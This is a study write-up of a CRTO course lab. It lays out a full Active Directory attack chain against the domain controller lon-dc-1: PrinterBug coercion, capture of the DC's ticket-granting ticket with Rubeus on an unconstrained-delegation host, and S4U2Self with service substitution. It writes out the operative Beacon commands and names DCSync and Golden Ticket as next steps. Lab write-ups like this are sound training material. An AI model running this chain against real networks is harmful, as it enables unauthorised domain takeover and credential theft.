# CRTO — S4U2Self Lab

**Course:** Red Team Ops (CRTO) by RastaMouse — Zero Point Security
**Lab:** S4U2Self
**Objective:** Combine unconstrained delegation, remote authentication coercion (PrinterBug), and S4U2Self to compromise any machine in the domain — including Domain Controllers

---

## The Full Chain

```
ldapsearch → confirm lon-ws-1$ has unconstrained delegation
    ↓
Impersonate rsteel → lateral move to lon-ws-1 (SYSTEM Beacon)
    ↓
Rubeus monitor mode → watch for incoming TGTs targeting lon-dc-1$
    ↓
SharpSpoolTrigger → coerce lon-dc-1 to authenticate to lon-ws-1 (PrinterBug)
    ↓
Rubeus captures lon-dc-1$'s TGT as it arrives via unconstrained delegation
    ↓
krb_s4u /self → S4U2Self only (no S4U2Proxy) → TGS for Administrator → lon-dc-1$
    ↓
/altservice substitutes → cifs/lon-dc-1
    ↓
Inject ticket → ls \\lon-dc-1\c$ succeeds as Administrator
```

---

## Why This Is the Most Powerful Delegation Abuse

The previous delegation labs required the target machine to have delegation configured pointing to a useful service. This lab has **no such requirement** — it works against *any machine in the domain*, including DCs, by combining:

1. **Unconstrained delegation** on a compromised machine (lon-ws-1) — captures any TGT sent to it
2. **Coercion** (PrinterBug) — forces a target machine to authenticate to lon-ws-1, delivering its TGT
3. **S4U2Self** — uses the captured machine TGT to impersonate any user *to that same machine*
4. **Service name substitution** — converts the S4U2Self ticket into a usable CIFS ticket

The result: **full admin access to any machine whose TGT you can capture via coercion** — including DCs.

---

## Step 1 — Enumeration and Setup

```bash
# Confirm lon-ws-1$ has unconstrained delegation (UAC bit 524288)
ldapsearch (&(samAccountType=805306369)(userAccountControl:1.2.840.113556.1.4.803:=524288)) --attributes samAccountName

# Impersonate rsteel → lateral move
steal_token [rsteel_pid]
ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
jump scshell64 lon-ws-1 smb
```

---

## Step 2 — Rubeus Monitor Mode

From the SYSTEM Beacon on lon-ws-1:

```bash
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:3 /targetuser:lon-dc-1$ /nowrap
```

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `monitor` | — | Continuously watch the ticket cache for new TGTs arriving |
| `/interval:3` | 3 seconds | Poll interval — check for new tickets every 3 seconds |
| `/targetuser:lon-dc-1$` | — | Only capture tickets for this specific account — avoids noise from other authentications |
| `/nowrap` | — | Output base64 ticket on a single line — easier to copy |

> Rubeus monitor mode works because lon-ws-1 has unconstrained delegation — when lon-dc-1 authenticates to it, the DC's TGT is forwarded and cached in LSASS. Rubeus detects the new ticket and prints it.

**TTP:** T1558.001 — Steal or Forge Kerberos Tickets

---

## Step 3 — Coerce Authentication (PrinterBug / SpoolSample)

```bash
execute-assembly C:\Tools\SharpSystemTriggers\SharpSpoolTrigger\bin\Release\SharpSpoolTrigger.exe lon-dc-1 lon-ws-1
```

**Arguments:**

| Argument | Value | Meaning |
|---|---|---|
| Target | `lon-dc-1` | The machine to coerce — must have Print Spooler service running |
| Listener | `lon-ws-1` | The machine to coerce authentication *to* — must have unconstrained delegation |

**How PrinterBug works:**

```
SharpSpoolTrigger calls MS-RPRN RpcRemoteFindFirstPrinterChangeNotification on lon-dc-1
    ↓
lon-dc-1's Print Spooler service is forced to authenticate back to lon-ws-1
    ↓
Authentication uses lon-dc-1$'s machine account — Kerberos TGT is forwarded
    (unconstrained delegation means the full TGT is sent, not just a service ticket)
    ↓
Rubeus monitor detects the new ticket → prints base64 TGT for lon-dc-1$
```

**TTP:** T1187 — Forced Authentication
**TTP:** T1557 — Adversary-in-the-Middle (coercion context)

> **PrinterBug requires the Print Spooler service to be running on the target.** DCs often have it running by default — check with `sc_qc spooler` on the target if coercion fails. Alternative coercion tools: PetitPotam (MS-EFSRPC), DFSCoerce (MS-DFSNM), Coercer (multi-protocol).

---

## Step 4 — S4U2Self with Service Name Substitution

```bash
krb_s4u /ticket:[LON-DC-1$ TGT] /self /altservice:cifs/lon-dc-1 /impersonateuser:Administrator
```

**Flag breakdown:**

| Flag | Value | Purpose |
|---|---|---|
| `/ticket` | Base64 lon-dc-1$ TGT | DC machine account TGT captured via coercion |
| `/self` | — | **S4U2Self only** — no S4U2Proxy step |
| `/altservice` | `cifs/lon-dc-1` | Service name to substitute into the resulting ticket |
| `/impersonateuser` | `Administrator` | User to impersonate — any domain user is valid |

### Why `/self` Instead of `/service`

| Flag | Protocol Steps | When to Use |
|---|---|---|
| `/service:cifs/lon-fs-1` | S4U2Self + S4U2Proxy | Constrained delegation — machine is delegated to the target service |
| `/self` | **S4U2Self only** | No constrained delegation — machine requests ticket for itself, then altservice substitutes |

**The critical insight:** S4U2Self allows any machine with `TRUSTED_TO_AUTH_FOR_DELEGATION` to request a TGS for any user *to itself*. For a DC machine account (which inherently has this flag), this means:

```
lon-dc-1$ TGT → S4U2Self → TGS for Administrator → lon-dc-1$ (the DC itself)
                          ↓ /altservice substitution
                          TGS for Administrator → cifs/lon-dc-1
```

No constrained delegation config needed — the DC's TGT alone is sufficient.

---

## Step 5 — Access the DC

```bash
# Create sacrificial session
make_token CONTOSO\Administrator FakePass

# Inject the ticket
kerberos_ticket_use [path to ticket]

# Verify
run klist

# Access DC admin share
ls \\lon-dc-1\c$
```

> `ls \\lon-dc-1\c$` succeeding as Administrator against the DC confirms full domain compromise. Next steps: DCSync for all hashes, Golden Ticket for persistence.

---

## How This Lab Combines All Previous Techniques

```
Unconstrained Delegation lab  →  capture TGTs from authenticated users/machines
Service Name Substitution lab →  /altservice to convert useless SPN to cifs
S4U2Self lab                  →  /self flag — no constrained delegation needed
                                  combine with coercion to target any machine
```

This is the **complete attack chain** that requires no pre-existing delegation config on the target — just unconstrained delegation on *any* machine you control.

---

## Coercion Tool Reference

| Tool | Protocol | Notes |
|---|---|---|
| SharpSpoolTrigger / SpoolSample | MS-RPRN (Print Spooler) | Requires Spooler running on target — most common |
| PetitPotam | MS-EFSRPC | Works even without Print Spooler — patched on some systems |
| DFSCoerce | MS-DFSNM | DFS namespace manager — less commonly patched |
| Coercer | Multi-protocol | Tries multiple coercion methods automatically |

> Always check if the Print Spooler is running on the target before attempting SharpSpoolTrigger:
> ```bash
> sc_qc spooler    # in Beacon
> ```

---

## MITRE ATT&CK Mapping

| TTP | Technique | Detail |
|---|---|---|
| T1558.001 | Steal or Forge Kerberos Tickets | Capture DC TGT via Rubeus monitor on unconstrained delegation machine |
| T1187 | Forced Authentication | PrinterBug coerces lon-dc-1 to authenticate to lon-ws-1 |
| T1550.003 | Pass the Ticket | Inject S4U2Self ticket into sacrificial session |
| T1134.001 | Access Token Manipulation | Impersonate Administrator via S4U2Self |

---

## Key Takeaways

- This attack targets **any machine** — the target (lon-dc-1) needs **no delegation config at all**; only lon-ws-1 needs unconstrained delegation
- Coercion is the critical enabler — without it, you wait for a privileged machine to authenticate organically; with it, you force it on demand
- `/self` flag = S4U2Self only — used when you have the target machine's TGT directly (no constrained delegation chain needed)
- DC machine accounts always have `TRUSTED_TO_AUTH_FOR_DELEGATION` implicitly — their TGT can always be used for S4U2Self
- **Rubeus `/targetuser`** filters to a specific account — always set this to avoid processing noise from other authentications on a busy machine
- Always verify the Print Spooler is running on the coercion target — it's disabled on patched/hardened DCs; have alternative coercion tools ready
- This chain (unconstrained delegation + coercion + S4U2Self) is one of the most reliable paths to full domain compromise in environments where DCSync or direct DA access isn't immediately available
